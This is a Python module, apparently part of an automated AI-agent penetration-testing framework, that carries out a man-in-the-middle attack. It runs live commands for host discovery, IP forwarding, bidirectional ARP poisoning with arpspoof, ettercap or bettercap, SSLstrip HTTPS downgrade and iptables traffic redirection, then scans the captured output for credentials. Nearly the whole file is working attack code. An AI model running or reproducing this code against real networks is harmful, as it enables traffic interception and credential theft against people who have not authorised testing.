"""
mitm_subagent.py — ARP poisoning and Man-in-the-Middle attack setup.

AGENT_NAME  : "traffic"
SUBAGENT_NAME: "mitm"

Methodology:
  1. Discover live hosts on local segment (arp-scan / netdiscover)
  2. Identify default gateway
  3. Enable IP forwarding (kernel parameter)
  4. Launch ARP poisoning (arpspoof or ettercap) against target + gateway
  5. Configure iptables for transparent traffic interception
  6. Optional: bettercap for active HTTPS downgrade + SSLstrip
  7. Monitor captured traffic for credentials
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_HOST_RE    = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', re.M)
_GW_RE      = re.compile(r'(?:default|0\.0\.0\.0)\s+(?:via\s+)?(\d+\.\d+\.\d+\.\d+)', re.I)
_ARP_RE     = re.compile(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})', re.I)


class MitmSubagent(BaseSubagent):
    """Set up ARP poisoning and MITM for traffic interception."""

    AGENT_NAME    = "traffic"
    SUBAGENT_NAME = "mitm"

    async def run(self, target: str, interface: str = "eth0",
                  victim_ip: str = "",
                  gateway_ip: str = "",
                  duration: int = 60,
                  use_bettercap: bool = False,
                  **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)

        # ── Discover gateway ───────────────────────────────────────────
        if not gateway_ip:
            gw_out = await self.collect_tool("bash", target,
                {"options": "-c \"ip route show | grep -E 'default|0.0.0.0'\""})
            m = _GW_RE.search(gw_out)
            gateway_ip = m.group(1) if m else ""

        await self.store_finding(Finding(
            title=f"MITM Setup: Gateway={gateway_ip or 'Unknown'}, Interface={interface}",
            description=f"MITM preparation. Victim: {victim_ip or 'subnet'}, Gateway: {gateway_ip}, Interface: {interface}",
            severity="INFO",
            evidence=f"gw={gateway_ip} iface={interface}", tool="bash", host=target,
            mitre_technique="T1557.002",
        ))

        # ── Host discovery (if no victim specified) ────────────────────
        if not victim_ip:
            arp_out = await self.collect_tool("bash", target,
                {"options": f"-c \"arp-scan --interface={interface} -l 2>/dev/null | head -30 || netdiscover -i {interface} -r {target}/24 -P 2>/dev/null | head -30\""})
            hosts = _ARP_RE.findall(arp_out)
            if hosts:
                await self.store_finding(Finding(
                    title=f"MITM: {len(hosts)} Host(s) Discovered on Segment",
                    description=f"Live hosts on local segment:\n" + "\n".join([f"{h[0]} ({h[1]})" for h in hosts[:10]]),
                    severity="INFO",
                    evidence=arp_out[:600], tool="bash", host=target,
                    mitre_technique="T1018",
                    exploit_suggestion=f"Target specific host: set victim_ip={hosts[0][0]}",
                ))
            victim_ip = hosts[0][0] if hosts else target

        # ── Check MITM tools ───────────────────────────────────────────
        tools_out = await self.collect_tool("bash", target,
            {"options": "-c \"which arpspoof ettercap bettercap 2>/dev/null\""})
        has_arpspoof  = "arpspoof" in tools_out
        has_ettercap  = "ettercap" in tools_out
        has_bettercap = "bettercap" in tools_out

        # ── Enable IP forwarding ───────────────────────────────────────
        fwd_out = await self.collect_tool("bash", target,
            {"options": "-c \"echo 1 > /proc/sys/net/ipv4/ip_forward && cat /proc/sys/net/ipv4/ip_forward\""})
        ip_fwd_enabled = fwd_out.strip() == "1"

        await self.store_finding(Finding(
            title=f"MITM: IP Forwarding {'ENABLED' if ip_fwd_enabled else 'FAILED'}",
            description=f"Kernel IP forwarding (required for transparent MITM): {ip_fwd_enabled}.",
            severity="INFO" if ip_fwd_enabled else "MEDIUM",
            evidence=fwd_out.strip(), tool="bash", host=target,
            mitre_technique="T1557.002",
        ))

        # ── Launch bettercap (preferred) ───────────────────────────────
        if use_bettercap and has_bettercap:
            bc_cmds = (
                f"net.probe on; "
                f"set arp.spoof.targets {victim_ip}; "
                f"arp.spoof on; "
                f"net.sniff on; "
                f"http.proxy on; "
                f"set http.proxy.sslstrip true"
            )
            bc_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {duration} bettercap -iface {interface} -eval '{bc_cmds}' 2>&1 | tee /tmp/bettercap_{victim_ip.replace('.','_')}.log; echo DONE\""})
            captured = "DONE" in bc_out
            creds_found = bool(re.search(r'(password|credentials|login)', bc_out, re.I))
            await self.store_finding(Finding(
                title=f"MITM (bettercap): ARP Spoof + SSLstrip {'Running' if captured else 'Failed'}{' — CREDS FOUND' if creds_found else ''}",
                description=f"bettercap MITM against {victim_ip} via {gateway_ip}. Duration: {duration}s. Credentials captured: {creds_found}.",
                severity="CRITICAL" if creds_found else "HIGH",
                evidence=bc_out[:800], tool="bash", host=target,
                mitre_technique="T1557.002",
            ))

        elif has_arpspoof and gateway_ip:
            # ── arpspoof (dual direction) ──────────────────────────────
            # Poison victim (tell victim: gateway MAC = attacker MAC)
            spoof1_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {duration} arpspoof -i {interface} -t {victim_ip} {gateway_ip} 2>&1 &\""})
            # Poison gateway (tell gateway: victim MAC = attacker MAC)
            spoof2_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {duration} arpspoof -i {interface} -t {gateway_ip} {victim_ip} 2>&1 &\""})

            await self.store_finding(Finding(
                title=f"MITM (arpspoof): Bidirectional ARP Poison — {victim_ip} <-> {gateway_ip}",
                description=f"ARP spoofing launched. Victim: {victim_ip}, Gateway: {gateway_ip}. Traffic now flows through attacker.",
                severity="HIGH",
                evidence=f"v→g: {spoof1_out[:200]}\ng→v: {spoof2_out[:200]}", tool="bash", host=target,
                mitre_technique="T1557.002",
                exploit_suggestion=f"Now capture: tcpdump -i {interface} host {victim_ip} -w /tmp/mitm.pcap",
            ))

            # ── iptables redirect for transparent proxy ────────────────
            ipt_out = await self.collect_tool("bash", target,
                {"options": f"-c \"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080 2>&1; iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8443 2>&1; echo RULES_OK\""})
            await self.store_finding(Finding(
                title=f"MITM: iptables Redirect {'Configured' if 'RULES_OK' in ipt_out else 'Failed'}",
                description="iptables NAT rules for transparent HTTP/HTTPS interception on ports 8080/8443.",
                severity="INFO",
                evidence=ipt_out[:300], tool="bash", host=target,
                mitre_technique="T1557.002",
            ))

        elif has_ettercap and gateway_ip:
            # ── ettercap (fallback) ───────────────────────────────────
            et_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {duration} ettercap -T -q -i {interface} -M arp:remote /{victim_ip}// /{gateway_ip}// 2>&1 | tail -30; echo DONE\""})
            creds = _ARP_RE.findall(et_out)
            await self.store_finding(Finding(
                title=f"MITM (ettercap): ARP Poison {'Complete' if 'DONE' in et_out else 'Running'}",
                description=f"ettercap ARP poisoning against {victim_ip}. Duration: {duration}s.",
                severity="HIGH",
                evidence=et_out[:600], tool="bash", host=target,
                mitre_technique="T1557.002",
            ))

        else:
            await self.store_finding(Finding(
                title="MITM: No ARP Poisoning Tool Available",
                description=f"None of arpspoof/ettercap/bettercap found. Install: apt install dsniff ettercap-text-only. Gateway: {gateway_ip or 'unknown'}.",
                severity="INFO",
                evidence=tools_out[:200], tool="bash", host=target,
                mitre_technique="T1557.002",
                exploit_suggestion="Install: apt install -y dsniff bettercap",
            ))

        # ── Cleanup: restore ARP (on completion) ──────────────────────
        if gateway_ip and victim_ip:
            restore_out = await self.collect_tool("bash", target,
                {"options": f"-c \"arp -s {victim_ip} $(arp -n {victim_ip} | awk '{{print $3}}' | grep -v HW) 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward; echo RESTORED\""})
            await self.store_finding(Finding(
                title="MITM: ARP Table Restored, IP Forwarding Disabled",
                description="Post-MITM cleanup: ARP cache restored, kernel IP forwarding disabled.",
                severity="INFO",
                evidence=restore_out[:200], tool="bash", host=target,
                mitre_technique="T1070",
            ))

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
